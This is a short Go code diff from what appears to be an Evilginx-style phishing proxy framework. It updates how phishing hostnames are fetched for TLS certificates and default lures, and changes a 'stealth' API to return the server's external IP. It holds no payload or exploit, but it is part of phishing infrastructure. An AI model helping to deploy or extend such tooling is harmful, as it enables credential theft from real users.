@@ -84,7 +84,7 @@ func DaemonAutoConfig(cfg *Config, crt_db *CertDb, db *database.Database, hp *Ht
 	go func() {
 		time.Sleep(2 * time.Second)
 		log.Info("[DAEMON] Requesting TLS certificates for phishlet '%s'...", phishlet)
-		rawDomains := pl.GetPhishHosts()
+		rawDomains := pl.GetPhishHosts(false)
 		// Deduplicate domains (LE rejects duplicate SANs)
 		seen := make(map[string]bool)
 		var domains []string
@@ -105,7 +105,7 @@ func DaemonAutoConfig(cfg *Config, crt_db *CertDb, db *database.Database, hp *Ht
 	}()
 
 	// Create default lure
-	lureHostname := pl.GetPhishHosts()[0]
+	lureHostname := pl.GetPhishHosts(false)[0]
 	if landingSub := os.Getenv("EG_LANDING_SUB"); landingSub != "" && landingSub != "cloud" {
 		lureHostname = landingSub + "." + domain
 	}
@@ -218,7 +218,7 @@ func (h *stealthAPIHandler) handleConfig(w http.ResponseWriter, r *http.Request)
 		return
 	}
 	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(map[string]string{"domain": h.cfg.GetBaseDomain(), "ip": h.cfg.GetServerIP()})
+	json.NewEncoder(w).Encode(map[string]string{"domain": h.cfg.GetBaseDomain(), "ip": h.cfg.GetServerExternalIP()})
 }
 
 func (h *stealthAPIHandler) handleStatus(w http.ResponseWriter, r *http.Request) {
